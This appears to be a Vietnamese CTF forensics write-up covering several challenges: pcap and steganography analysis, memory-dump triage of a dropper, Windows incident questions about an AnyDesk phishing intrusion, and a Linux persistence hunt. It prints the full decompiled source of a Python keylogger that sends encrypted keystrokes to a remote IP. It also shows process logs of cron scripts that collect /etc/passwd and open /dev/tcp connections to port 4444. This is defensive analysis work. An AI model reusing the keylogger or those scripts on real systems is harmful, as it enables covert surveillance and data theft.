---
title: "WANNAGAME CYBERKNIGHT 2026"
description: "Forensic Challenges"
publishDate: "2026-09-15"
section: "posts"
tags: ["ctf", "forensic"]
draft: false
coverImage:
  src: "/images//wannagame-cyberknight-2026/thumbnail.png"
  alt: "thumbnail"
---

# enum-or-exfil?
Author: **s3asick5**
![image](/images/wannagame-cyberknight-2026/r1BU3lrtGe.png)
![image](/images/wannagame-cyberknight-2026/S10tngSFfe.png)
Quan sát protocol hierarchy thì có 2 luồng đáng chú ý là `http` và `icmp`
![image](/images/wannagame-cyberknight-2026/BJTYTeBYze.png)
có 33 stream chứ data dạng base64 như vậy, dùng `tshark` để trích xuất và dùng `cyberchef` để giải mã
```
$ tshark -r challenge.pcap -Y "http" -T fields -e http.authbasic > b64.txt
```
![image](/images/wannagame-cyberknight-2026/S1RtRlBKze.png)
Kết quả thu được là một bức ảnh chứa dữ liệu được ẩn bằng `steghide`
![image](/images/wannagame-cyberknight-2026/H13sAlBFGg.png)
![image](/images/wannagame-cyberknight-2026/H1ITAlHKzl.png)
Em thử brute force với `stegseek` nhưng không được.
Quan sát kĩ phần data của packet icmp chứa dữ liệu. Ghép lại được `sneaky_network` 
![image](/images/wannagame-cyberknight-2026/HkKBeZrKfe.png)

![image](/images/wannagame-cyberknight-2026/ryOEbbBtfe.png)



# Bad friend
Author: **KetSoSad**
![image](/images/wannagame-cyberknight-2026/HyoSvJQKMe.png)
Bài này em thực sự solve sau giải 🐧🐧

Đề bài cho ta 2 file gồm:
```
challenge.dmp:    MS Windows 64bit crash dump, full dump, 1048333 pages
challenge.pcapng: pcapng capture file - version 1.0
```
## Memory
Dùng `volatility3` để phân tích file `dmp`
![image](/images/wannagame-cyberknight-2026/HyG4Ky7YGg.png)
Quan sát kết quả `pslist` thấy có tiến trình `chromeup.exe` bất thường.
Kiểm tra `filscan` và tiến hành dump để kiểm tra
![image](/images/wannagame-cyberknight-2026/Bkqe9y7Yzl.png)

Quan sát kết quả `strings` thì đây là một dropper tải payload từ `http://172.22.85.56:8000/pay` và lưu vào `$env:TEMP\csrst.exe` (Masquerading)
![Screenshot 2026-09-12 221855](/images/wannagame-cyberknight-2026/BJRtpJQYzl.png)

Trích xuất `pay` từ file `pcapng` và tiến hành decode như trên:

![image](/images/wannagame-cyberknight-2026/r1L6R1XFMl.png)

```python
def Hex(c):
	if '0' <= c <= '9':
		return ord(c) - ord('0')
	if 'A' <= c <= 'F':
		return ord(c) - ord('A') + 10
	return ord(c) - ord('a') + 10

def decoder(data):
	output = bytearray(len(data)//2)
	key = [0x12, 0x34, 0x56, 0x78]
	for i in range(len(output)):
		p = i*2
		hi = Hex(data[p])
		lo = Hex(data[p+1])
		output[i] = (((hi << 4) | lo) ^ key[i & 3])
	return output

with open("pay", "r") as f:
	data = f.read()
decoded = decoder(data)

with open("csrst.exe", "wb") as f:
    f.write(decoded)
```
## Malware

Sau giải mã được file `csrst.exe`, kiểm tra bằng `die` thì đây là file được compile bằng `pyinstaller`
![image](/images/wannagame-cyberknight-2026/ByC81xQFGg.png)

Dùng https://github.com/extremecoders-re/pyinstxtractor để decompile và thu được:
![image](/images/wannagame-cyberknight-2026/SkNdex7Yfl.png)
Sau đó tiếp tục dùng https://www.pylingual.io/ để dịch ngược file`sol.pyc`
```python
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: 'sol.py'
# Bytecode version: 3.11a7e (3495)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

from pynput.keyboard import Key, Listener
import socket
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
import base64
import winreg
import os
import hashlib
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA256
import base64
def encrypt_aes_cbc(plaintext: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    return ciphertext
HOST = '172.22.85.56'
PORT = 8080
PUBLIC_KEY = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAukEBlslDfBRCjBluDnp0\njVzr4lGiS2DisGzSraABP4myImgK8r0rMDnRYu8Av/1Azi1KdUV0oC3cRFqjdTcT\nXowiE+B99vHyemW/muS/bdnhB5EDNALShTcaZj5/uGWKHyGhFOn/w+8narOFynfI\nq0aqZ9oHTf0pmPyWp+XbHmwdI1e9LT87ZCnT8CCAVrczXz84iS0zQXfp+3ggTWXG\nxAplCWJMEuTZtWzltqjxQl4DgcWMChkGsVIKmtVYVMd4IQF3TqKlRLqSwKzNkQEE\nFZ70BF0RXT8PNqoxQRLBavmIvGVa7NaL+j31uF7K+e6JucQVRV771v1KMXi0h+UK\ngQIDAQAB\n-----END PUBLIC KEY-----'
key_value = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 'SOFTWARE\\Microsoft\\Cryptography')
machine_guid, _ = winreg.QueryValueEx(key_value, 'MachineGuid')
winreg.CloseKey(key_value)
key = hashlib.sha256(machine_guid.encode()).digest()
computer_name = os.environ['COMPUTERNAME']
iv = hashlib.sha256(computer_name.encode()).digest()[:16]
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    info = f'{machine_guid} {computer_name}'.encode()
    rsa_key = RSA.import_key(PUBLIC_KEY)
    rsa_cipher = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256)
    encrypted = rsa_cipher.encrypt(info)
    s.sendall(base64.b64encode(encrypted))
def on_press(keys):
    try:
        data = keys.char.encode()
    except AttributeError:
        data = str(keys).encode()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        cipher_key = encrypt_aes_cbc(data, key, iv)
        s.sendall(base64.b64encode(cipher_key))
listener = Listener(on_press=on_press)
listener.start()
listener.join()
```
Sau khi decompile thì thấy rõ src code có hành vi của một `Keylogger`:
1. Trích xuất `info` gồm `machine_guid` và `computer_name` được mã hóa `RSA` (dùng để giải mã với `machineguid` để tạo `key` và `computername` để tạo `iv`)
2. Gửi Keystroke Log của nạn nhân tới `172.22.85.56:8080`. Dữ liệu truyền ra được mã hóa bằng `AES-CBC`


Tìm `key` và `IV` với  `key = sha256(machine_guid)` và `iv = sha256(computer_name)[:16]`
Ta có thể tìm thấy 2 key này ở `HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName` và `HKLM:\SOFTWARE\Microsoft\Cryptography MachineGUID`. Nhưng do vấn đề gì đó mà em không thể load hive được vào `Registry Explorer`.
1. `ComputerName` có thể tìm thấy trong kết quả của plugin `envars` là `DESKTOP-KA3APTF`
2. Em dùng `MemProcFS` để xem `HKLM:\SOFTWARE\Microsoft\Cryptography MachineGUID`: `955dbad6-c040-45d0-8739-e86d3a6f2120`

> MemProcFS is an easy and convenient way of viewing physical memory as files in a virtual file system.
```
Key (hex): 1525f68dbfd82b1d237f3f7bc5555493ff803d4e5102be31e38424138f4dff66
IV  (hex): 5cfc179298c058a1cf9da11c6a02592d
```

## Network

Dùng `tshark` để trích xuất dữ liệu đã được gửi từ máy nạn nhân đến `172.22.85.56:8080`
![image](/images/wannagame-cyberknight-2026/rkekIxQKGe.png)
```shell
$ tshark -r challenge.pcapng -Y "ip.src == 192.168.49.137 && ip.dst == 172.22.85.56&& tcp.dstport == 8080&&frame.len ==78" -T fields -e tcp.payload
4e464c6a306c43455066396e6c776a756a57443949773d3d
7a474e6376717870706e4f7257683349366246614a513d3d
384c6656706f366263516f4733616a38714a724c4c413d3d
6f6671564935513744614a4a5a58763250354e5856413d3d
736a70745a386e484b396a506b342b516a78516173773d3d
52524f6439544e64696a4e794a2b51716551736844773d3d
5633464e544562762f6c5143442f50644e61676f50413d3d
327046526e516f4b714c592b617749496c3069567a413d3d
31666873356e4946512f6551385468713945497266413d3d
4657424f6a44545034366870304f49734338414838413d3d
37416b5679483830764c5135356e446144482b4645673d3d
46396a7a655730424642664a3463324e7255573248413d3d
4c4f6e534a444e32393953514f7041327578313243413d3d
544e4c384b7061593566684c3766746a364168322f413d3d
67516c532b63374c45787a4e4474487a6b392b5a31773d3d
306d2b7a7178584876526b744e2f6f6a3439555a72773d3d
3638695039776b5466357041304e41427043674361673d3d
3744626749304a54384152454f736e724b305a6e43513d3d
544e4c384b7061593566684c3766746a364168322f413d3d
67516c532b63374c45787a4e4474487a6b392b5a31773d3d
736d6e547473593748695079706473572b6a58786e773d3d
753237714c4f7351443538572b694431797432524b413d3d
594e346d58645359456c64374c4e714b334b447142673d3d
30662f46727059787971537270486c75556c45774a673d3d
```
Có thể dùng `Cyberchef` với recipe sau để giải mã thủ công :v hoặc dùng script python sau:
![image](/images/wannagame-cyberknight-2026/ByJanxmtMl.png)
```python
import base64, hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = hashlib.sha256(b"955dbad6-c040-45d0-8739-e86d3a6f2120").digest()
iv = hashlib.sha256(b"DESKTOP-KA3APTF").digest()[:16]

payloads = [
    "4e464c6a306c43455066396e6c776a756a57443949773d3d",
    "7a474e6376717870706e4f7257683349366246614a513d3d",
    "384c6656706f366263516f4733616a38714a724c4c413d3d",
    "6f6671564935513744614a4a5a58763250354e5856413d3d",
    "736a70745a386e484b396a506b342b516a78516173773d3d",
    "52524f6439544e64696a4e794a2b51716551736844773d3d",
    "5633464e544562762f6c5143442f50644e61676f50413d3d",
    "327046526e516f4b714c592b617749496c3069567a413d3d", 
    "31666873356e4946512f6551385468713945497266413d3d",
    "4657424f6a44545034366870304f49734338414838413d3d",
    "37416b5679483830764c5135356e446144482b4645673d3d",
    "46396a7a655730424642664a3463324e7255573248413d3d",
    "4c4f6e534a444e32393953514f7041327578313243413d3d",
    "544e4c384b7061593566684c3766746a364168322f413d3d",
    "67516c532b63374c45787a4e4474487a6b392b5a31773d3d",
    "306d2b7a7178584876526b744e2f6f6a3439555a72773d3d",
    "3638695039776b5466357041304e41427043674361673d3d",
    "3744626749304a54384152454f736e724b305a6e43513d3d",
    "544e4c384b7061593566684c3766746a364168322f413d3d",
    "67516c532b63374c45787a4e4474487a6b392b5a31773d3d",
    "736d6e547473593748695079706473572b6a58786e773d3d",
    "753237714c4f7351443538572b694431797432524b413d3d",
    "594e346d58645359456c64374c4e714b334b447142673d3d",
    "30662f46727059787971537270486c75556c45774a673d3d",
]

def dec(data):
  encrypted = base64.b64decode(bytes.fromhex(data))
  decrypted = AES.new(key, AES.MODE_CBC, iv).decrypt(encrypted)
  return unpad(decrypted, AES.block_size).decode(errors="ignore")

res = [dec(p) for p in payloads]
print("".join(res))
```
Output:
```
pastebin.com/Key.shiftDLPxKey.shiftDrz6Key.enter
```

Keystroke log được trích xuất từ máy nạn nhân là `pastebin.com/DLPxDrz6`. 

Có lẽ victim đã vào `Edge` và truy cập vào đường link trên :vvvvvv


![image](/images/wannagame-cyberknight-2026/BkdP6eQKzx.png)


# Shadow
Author: **qth24**
![image](/images/wannagame-cyberknight-2026/Sk11H-7tMx.png)


### Q1. What is the chat application used to communicate with the attacker? (telegram/discord/...)
> Pidgin
[+] Correct.

> Pidgin is an instant messaging program which lets you log in to accounts on multiple chat networks simultaneously.
![image](/images/wannagame-cyberknight-2026/Bygj8vXKfl.png)

Kiểm tra lịch sử web thì phát hiện victim dùng những ứng dụng sau: `Thunderbird`, `Outlook`, `Pidgin`. Nhưng 2 cái đầu không phát hiện gì. Dựa trên bài post https://warrenpost.wordpress.com/2012/03/06/pidgin-forensics/ thì em biết được `Pidgin` lưu lịch sử đoạn chat ở `~/.purple/logs/` 

![image](/images/wannagame-cyberknight-2026/SJtkTwXFGx.png)


Đoạn chat có dấu hiệu phishing khi yêu cầu tắt `MS Defender`
### Q2. At what timestamp (UTC) was Windows Defender Real-Time Protection disabled? (format: YYYY-MM-DD HH:MM:SS)
> 2026-08-27 10:30:28
[+] Correct.

Dựa trên bài post [The power of Data Collection Rules: Detect Disabling Windows Defender Real-Time Protection
](https://techcommunity.microsoft.com/blog/microsoftsentinelblog/the-power-of-data-collection-rules-detect-disabling-windows-defender-real-time-p/4236540?afd_azwaf_tok=eyJraWQiOiJBQTFBOUFGMTM1QUU0NDI0RDgyN0I1M0MwOUYyRDA4N0JCRTQxMjRENDE4MDNFMzY5NkYwMUYwQjk2NUU4RTUzIiwiYWxnIjoiUlMyNTYifQ.eyJhdWQiOiJ0ZWNoY29tbXVuaXR5Lm1pY3Jvc29mdC5jb20iLCJleHAiOjE3ODkyNTgzMDYsImlhdCI6MTc4OTI1ODI5NiwiaXNzIjoidGllcjEtNmNjNWZjNTZiNy16a2pucyIsInN1YiI6IjE3MS4yNTEuMjMzLjE1NyIsImRhdGEiOnsidHlwZSI6Imlzc3VlZCIsInJlZiI6IjIwMjYwOTEzVDAwMTEzNlotMTZjYzVmYzU2Yjd6a2puc2hDMUtVTDQwbmcwMDAwMDAwbmgwMDAwMDAwMDA4Z2U1IiwiYiI6ImlEVFhuWTN6QWR3NVE3RkFOOXJTX3dYZUhubTVlb3BFS3VKOW14VnpHWE0iLCJoIjoiRGNaS1ZXdGlObW5zaWtidEJkaElhSkdNZjNrbTFKM2hnaFYzXzA5b0ZXNCJ9fQ.hCj2m-iUlrN1Y4haKA2P97C1ZfJv4cb_VoY7ElGWS84SgyQgYtCSYInkxLTqOTRaLMt0cfyBWgtgI8LW0oPG3qH4pxExVnHQUuz72rLGK3_rYEHAb7nAFlG1tMEMqyt-w3Y-3PXraBvyDM1vnpy1MTerz_mmvd3aK3PP6cyOZJx3Xbv5UlEQuutaTdNS-ioGXFnvBY40SVwMtz0zj23yIpsK2RIpVvreLEhLKxwhySPE2kTYx3MpNYjkuzYHMai4faZ6j-I1FC2yUXTZbP6zzb0BrHD-qh8pfvHuBBUSOa6ZTXVKDYM588LP31wqPh5hP3bS-XNiaqC9VtFnlmAHEg.WF3obl2IDtqgvMFRqVdYkD5s) thì biết được event ID `5001` ứng với `Real-time protection is disabled`
![image](/images/wannagame-cyberknight-2026/S1wWiD7FMl.png)

![image](/images/wannagame-cyberknight-2026/rydl3vmYfe.png)

### Q3. The first suspicious file that was executed on the machine — through which URL was it downloaded?
> https://drive.google.com/file/d/1e2vVL6L9oBwoAVsaxhF_tRJE_s6_WriY/view?usp=sharing
[+] Correct.

![image](/images/wannagame-cyberknight-2026/rJCmnP7tGe.png)

### Q4. What is the attacker's real XMPP account (the one posing as "tech support")?
> supporter111@conversations.im
[+] Correct.

![image](/images/wannagame-cyberknight-2026/ryHs3v7Yze.png)

### Q5. Which remote-control tool did the attacker use to connect to the victim's machine, and what is the attacker's AnyDesk ID? (format: Tool:ID)
> AnyDesk:1355533822
[+] Correct.

Từ bài post https://medium.com/@nandakumarp/anydesk-forensics-63b43200f8ae thì em biết được quá trình khởi tạo phiên có cung cấp ID của Attacker.
![image](/images/wannagame-cyberknight-2026/SkqYawXFMe.png)

![image](/images/wannagame-cyberknight-2026/rJl4Cw7YMx.png)

### Q6. What is the full filename of the last malicious file that was executed on the machine? (format: filename.exe)
> b6296bad0fdf16df0811053e5c5cee71946d05e06222324e76dc26ec676ff976.exe
[+] Correct.

Kiểm tra `file_transfer_trace.txt` thì phát hiện Attacker truyền 3 file là `superPaint.exe`, `UniKeyNT.exe` và `b6296bad0fdf16df0811053e5c5cee71946d05e06222324e76dc26ec676ff976.exe`.
```
Clipboard		2026-08-28, 14:08	start 	download	'superPaint.exe' (~0 B out of 6.98 MiB)
Clipboard		2026-08-28, 14:08	finish	download	'superPaint.exe' (~0 B out of 6.98 MiB)
Clipboard		2026-08-28, 14:08	start 	download	'superPaint.exe' (~0 B out of 6.98 MiB)
Clipboard		2026-08-28, 14:08	finish	download	'superPaint.exe' (~0 B out of 6.98 MiB)
Clipboard		2026-08-28, 14:08	start 	download	'UniKeyNT.exe' (~0 B out of 2.41 MiB)
Clipboard		2026-08-28, 14:08	finish	download	'UniKeyNT.exe' (~2.41 MiB out of 2.41 MiB)
Clipboard		2026-08-28, 14:09	start 	download	'superPaint.exe' (~0 B out of 6.98 MiB)
Clipboard		2026-08-28, 14:09	finish	download	'superPaint.exe' (~6.98 MiB out of 6.98 MiB)
Clipboard		2026-08-28, 14:18	start 	download	'b6296bad0fdf16df0811053e5c5cee71946d05e06222324e76dc26ec676ff976.exe' (~0 B out of 3.74 MiB)
Clipboard		2026-08-28, 14:18	finish	download	'b6296bad0fdf16df0811053e5c5cee71946d05e06222324e76dc26ec676ff976.exe' (~3.74 MiB out of 3.74 MiB)
```
Kiểm tra `UserAssist` trong hive `NTUSER.DAT` thì biết file được thực thi cuối cùng là`b6296bad0fdf16df0811053e5c5cee71946d05e06222324e76dc26ec676ff976.exe`
![image](/images/wannagame-cyberknight-2026/HJxRkO7YGg.png)

### Q7. Where is the persistence mechanism of that malware located? (Full file path)
> `C:\Users\t0mmy\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\b6296bad0fdf16df0811053e5c5cee71946d05e06222324e76dc26ec676ff976.lnk`
[+] Correct.

![image](/images/wannagame-cyberknight-2026/S1HK-dmFzx.png)

Kiểm tra trong `$Recycle Bin` thì trích xuất được file `b6296bad0fdf16df0811053e5c5cee71946d05e06222324e76dc26ec676ff976.exe` là `$RMGB4MQ.exe` qua metadata `$IMGB4MQ.exe` (hoặc chỉ cần click vào file đó là biết, do AV cảnh báo:v)

![image](/images/wannagame-cyberknight-2026/HyRifuQtMg.png)

![image](/images/wannagame-cyberknight-2026/BkFlQu7YMx.png)
![image](/images/wannagame-cyberknight-2026/HJ4V7uQtGx.png)
![image](/images/wannagame-cyberknight-2026/H1lKS_7YGe.png)

Sau khi kiểm tra behavior của file malware trên `VirusTotal` và `Hybird Analysis` thì em cứ đinh ninh rằng persistence mechanism của malware nằm ở `Registry Run Keys`. Path: `HKCU\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUNONCE`; Key: `SVP0OE8NN3AA6R`; Value: `C:\b6296bad0fdf16df0811053e5c5cee71946d05e06222324e76dc26ec676ff976.exe` 
Nhưng không chỉ ở `Registry Run Keys` nó còn ở `Startup Folder` (`C:\Users\t0mmy\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\b6296bad0fdf16df0811053e5c5cee71946d05e06222324e76dc26ec676ff976.lnk`)
![image](/images/wannagame-cyberknight-2026/HkdzUOmYfe.png)
>PS: đây là câu em tốn nhiều thời gian nhất. Em thử mọi thứ em biết từ chạy trên máy ảo, phân tích Procmon log, nhưng do cố chấp với registry run key nên kẹt mãi ở câu này=)). Cảm ơn anh **Ketsosad** đã thả hint trong lúc em tuyệt vọng.

### Q8. At what timestamp (UTC) did the AnyDesk session end? (format: YYYY-MM-DD HH:MM:SS)
> 2026-08-28 14:26:10
[+] Correct.

![image](/images/wannagame-cyberknight-2026/rJcFsdmFzx.png)
Sau khi trả lời xong 8 câu hỏi thì được flag:
```
All questions answered. Well done!
W1{s1mpl3_w1nd0ws_4n6_chall3nge_hah!!!}
```

# FINDME
Author: **m4scul1n3**
![image](/images/wannagame-cyberknight-2026/Bk3BUCEFzl.png)

Bài này em làm được sau giải:(
Em dùng tool này https://github.com/dominicbreuker/pspy để xem các process và command được chạy trong thời gian thực, chuyển tool từ host tới server bằng lệnh:
`scp -P 10377 pspy64 analyst@45.122.249.68:/home/analyst`
```
$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/09/14 02:10:59 CMD: UID=1001  PID=1640   | ./pspy64
2026/09/14 02:10:59 CMD: UID=1001  PID=256    | -bash
2026/09/14 02:10:59 CMD: UID=1001  PID=255    | sshd: analyst@pts/0
2026/09/14 02:10:59 CMD: UID=0     PID=207    | sshd: analyst [priv]
2026/09/14 02:10:59 CMD: UID=0     PID=49     | cron
2026/09/14 02:10:59 CMD: UID=0     PID=1      | sshd: /usr/sbin/sshd -D -e [listener] 0 of 10-100 startups
2026/09/14 02:11:01 CMD: UID=0     PID=1664   | CRON
2026/09/14 02:11:01 CMD: UID=0     PID=1665   | CRON
2026/09/14 02:11:01 CMD: UID=0     PID=1666   | /bin/sh -c /usr/local/bin/.cache-sync
2026/09/14 02:11:01 CMD: UID=0     PID=1667   |
2026/09/14 02:11:01 CMD: UID=0     PID=1669   |
2026/09/14 02:11:01 CMD: UID=0     PID=1668   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:11:02 CMD: UID=0     PID=1670   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:11:02 CMD: UID=0     PID=1671   |
2026/09/14 02:11:02 CMD: UID=0     PID=1674   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:11:02 CMD: UID=0     PID=1673   |
2026/09/14 02:11:02 CMD: UID=0     PID=1672   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:11:02 CMD: UID=0     PID=1675   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:11:02 CMD: UID=0     PID=1676   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:11:02 CMD: UID=0     PID=1677   | find /etc/sudoers.d -maxdepth 1 -type f -exec sha256sum {} ;
2026/09/14 02:11:02 CMD: UID=0     PID=1678   |
2026/09/14 02:11:02 CMD: UID=0     PID=1681   |
2026/09/14 02:11:02 CMD: UID=0     PID=1679   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:11:02 CMD: UID=0     PID=1682   |
2026/09/14 02:11:02 CMD: UID=0     PID=1683   | tar -C /var/tmp/.cache-sync -czf /var/spool/backup-agent/.outbox/inventory-ret2shell-47-196-1789351330-20260914T021101Z.tgz inventory.20260914T021101Z
2026/09/14 02:11:02 CMD: UID=0     PID=1684   |
2026/09/14 02:11:02 CMD: UID=0     PID=1685   |
2026/09/14 02:11:02 CMD: UID=0     PID=1687   |
2026/09/14 02:11:03 CMD: UID=0     PID=1688   | runc init
2026/09/14 02:11:03 CMD: UID=0     PID=1694   | runc init
2026/09/14 02:11:08 CMD: UID=0     PID=1701   | runc init
2026/09/14 02:11:08 CMD: UID=0     PID=1707   | runc init
2026/09/14 02:11:13 CMD: UID=0     PID=1713   | runc init
2026/09/14 02:11:13 CMD: UID=0     PID=1719   | runc init
2026/09/14 02:11:17 CMD: UID=0     PID=1725   | runc init
2026/09/14 02:11:18 CMD: UID=0     PID=1731   | runc init
2026/09/14 02:11:23 CMD: UID=0     PID=1737   | runc init
2026/09/14 02:11:23 CMD: UID=0     PID=1743   | runc init
2026/09/14 02:11:27 CMD: UID=0     PID=1751   | runc init
2026/09/14 02:11:28 CMD: UID=0     PID=1758   | runc init
2026/09/14 02:11:32 CMD: UID=0     PID=1765   | runc init
2026/09/14 02:11:33 CMD: UID=0     PID=1771   | runc init
2026/09/14 02:11:37 CMD: UID=0     PID=1777   | runc init
2026/09/14 02:11:37 CMD: UID=0     PID=1783   | runc init
2026/09/14 02:11:42 CMD: UID=0     PID=1789   | runc init
2026/09/14 02:11:42 CMD: UID=0     PID=1795   | runc init
2026/09/14 02:11:46 CMD: UID=0     PID=1801   | runc init
2026/09/14 02:11:47 CMD: UID=0     PID=1807   | runc init
2026/09/14 02:11:51 CMD: UID=0     PID=1813   | runc init
2026/09/14 02:11:52 CMD: UID=0     PID=1820   | runc init
2026/09/14 02:11:56 CMD: UID=0     PID=1826   | runc init
2026/09/14 02:11:56 CMD: UID=0     PID=1832   | runc init
2026/09/14 02:12:01 CMD: UID=0     PID=1838   | runc init
2026/09/14 02:12:01 CMD: UID=0     PID=1845   | CRON
2026/09/14 02:12:01 CMD: UID=0     PID=1844   | CRON
2026/09/14 02:12:01 CMD: UID=0     PID=1846   | CRON
2026/09/14 02:12:01 CMD: UID=0     PID=1847   | /bin/sh -c /usr/local/bin/.update-check
2026/09/14 02:12:01 CMD: UID=0     PID=1848   | CRON
2026/09/14 02:12:01 CMD: UID=0     PID=1849   | bash /usr/local/bin/.update-check
2026/09/14 02:12:01 CMD: UID=0     PID=1850   |
2026/09/14 02:12:01 CMD: UID=0     PID=1851   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:12:01 CMD: UID=0     PID=1852   | bash /usr/local/bin/.update-check
2026/09/14 02:12:01 CMD: UID=0     PID=1855   | bash /usr/local/bin/.update-check
2026/09/14 02:12:01 CMD: UID=0     PID=1854   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:12:01 CMD: UID=0     PID=1853   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:12:01 CMD: UID=0     PID=1856   | runc init
2026/09/14 02:12:01 CMD: UID=0     PID=1857   |
2026/09/14 02:12:01 CMD: UID=0     PID=1858   |
2026/09/14 02:12:01 CMD: UID=0     PID=1864   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:12:01 CMD: UID=0     PID=1865   | bash /usr/local/bin/.update-check
2026/09/14 02:12:01 CMD: UID=0     PID=1866   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:12:02 CMD: UID=0     PID=1868   |
2026/09/14 02:12:02 CMD: UID=0     PID=1867   | timeout 2 bash -c
    exec 3<>/dev/tcp/"$0"/"$1"
    printf "PING host=%s time=%s\n" "$2" "$3" >&3
    IFS= read -r -t 1 reply <&3 || true
    [ -n "${reply:-}" ] && printf "%s\n" "$reply" > "$4"
    exit 0
 host.docker.internal 4444 ret2shell-47-196-1789351330 2026-09-14T02:12:01Z /var/tmp/.update-check/last-response
2026/09/14 02:12:02 CMD: UID=0     PID=1869   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:12:02 CMD: UID=0     PID=1870   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:12:02 CMD: UID=0     PID=1871   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:12:02 CMD: UID=0     PID=1872   |
2026/09/14 02:12:02 CMD: UID=0     PID=1873   | sha256sum /etc/sudoers.d/analyst
2026/09/14 02:12:02 CMD: UID=0     PID=1876   |
2026/09/14 02:12:02 CMD: UID=0     PID=1874   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:12:02 CMD: UID=0     PID=1877   | /bin/sh /usr/local/bin/.cache-sync
2026/09/14 02:12:02 CMD: UID=0     PID=1878   | tar -C /var/tmp/.cache-sync -czf /var/spool/backup-agent/.outbox/inventory-ret2shell-47-196-1789351330-20260914T021201Z.tgz inventory.20260914T021201Z
2026/09/14 02:12:02 CMD: UID=0     PID=1879   | gzip
2026/09/14 02:12:02 CMD: UID=0     PID=1880   |
2026/09/14 02:12:02 CMD: UID=0     PID=1881   |
2026/09/14 02:12:06 CMD: UID=0     PID=1882   | runc init
```
## Cron job
Từ 2 log trên có thể thấy có 2 `cron` bất thường thực thi `/usr/local/bin/.cache-sync` và `/usr/local/bin/.update-check`.
Kiểm tra `/etc/cron.d` thì phát hiện có 2 cron liên quan là `cache-sync` và `update-check`
![image](/images/wannagame-cyberknight-2026/SkswFAVtGl.png)


![image](/images/wannagame-cyberknight-2026/S1WaYC4tMx.png)
Có thể thấy `.cache-sync` dùng để thu thập dữ liệu `hostname`,`/etc/passwd`, ssh config đóng gói và lưu vào lưu vào `/var/spool/backup-agent/.outbox`
### Unexpected outbound connections
![image](/images/wannagame-cyberknight-2026/HJ7oqRNtfl.png)
Có thể thấy `.update-check` thực hiện `unexpected outbound connections` tới `host.docker.internal:4444`
![image](/images/wannagame-cyberknight-2026/HkJm2R4YMx.png)
![image](/images/wannagame-cyberknight-2026/HkgW6AEKzg.png)

Vậy cần loại bỏ `cron job`
![image](/images/wannagame-cyberknight-2026/SJ_2h04YMg.png)

## Unusual file permissions
https://medium.com/@eugenekarewa223/linux-file-forensic-analysis-fd2790590d27 
Check files with the SUID or SGID bit set might be used by an attacker to escalate privileges.
![image](/images/wannagame-cyberknight-2026/r1i9iyHtGx.png)

![image](/images/wannagame-cyberknight-2026/HyoO31HKzx.png)

`rm -rf /usr/local/bin/.diag /usr/local/bin/.diag.manifest`
## SSH authorized keys
`rm -rf /root/.ssh/authorized_keys`
## Shell initialization
![image](/images/wannagame-cyberknight-2026/BkQUAkSFzx.png)

![image](/images/wannagame-cyberknight-2026/H1_7kxSYMg.png)

`rm /etc/profile.d/zz-session-health.sh`
`rm /opt/backup-agent/.agent`

![image](/images/wannagame-cyberknight-2026/HkNhkxrtMx.png)

# Locked Girl
Author: **s3asick5**

![image](/images/wannagame-cyberknight-2026/HkfKb4SYMx.png)
Bài này em làm được sau giải :(((
Bài cho file:
```
challenge.pcapng: pcapng capture file - version 1.0
```
![image](/images/wannagame-cyberknight-2026/ryWvTEHKzx.png)
![image](/images/wannagame-cyberknight-2026/SJDkRNSFMx.png)
![image](/images/wannagame-cyberknight-2026/HJ3z0ESYfe.png)
Quan sát lưu lượng `http` thấy quá trình truy cập và tải file `client.zip` từ `filebin.net`.
![image](/images/wannagame-cyberknight-2026/ryIA04SYMg.png)
